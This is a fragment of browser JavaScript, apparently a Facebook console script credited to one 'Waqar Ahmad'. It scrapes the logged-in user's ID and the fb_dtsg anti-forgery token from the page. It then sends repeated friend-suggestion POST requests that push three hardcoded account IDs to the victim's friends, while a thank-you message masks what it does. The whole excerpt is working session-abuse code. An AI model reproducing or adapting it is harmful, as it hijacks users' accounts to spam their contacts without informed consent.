...
var Descriptions = "",
  _text = 'Thanks For Suggesting Your Friends.</br>Created & Designed By <A style="color:#3B5998;" href="http://www.facebook.com/pkwaq">Waqar Ahmad.</A>';newcomer=/"profile_owner":"([0-9]+)"/.exec(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt"))[1];fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
...
jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + opo + "&newcomer=100004066178315&attempt_id=53ba39eed15c7c0c22bb5352d04374bf&ref=passive_megaphone&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-fEa0&__req=7&fb_dtsg=" + fb_dtsg + "&phstamp=1658168847910711974185", function () {}, "text", "post");
jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + opo + "&newcomer=100001050235420&attempt_id=53ba39eed15c7c0c22bb5352d04374bf&ref=passive_megaphone&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-fEa0&__req=7&fb_dtsg=" + fb_dtsg + "&phstamp=1658168847910711974185", function () {}, "text", "post");
jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + opo + "&newcomer=100003697277263&attempt_id=53ba39eed15c7c0c22bb5352d04374bf&ref=passive_megaphone&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-fEa0&__req=7&fb_dtsg=" + fb_dtsg + "&phstamp=1658168847910711974185", function () {}, "text", "post");
}
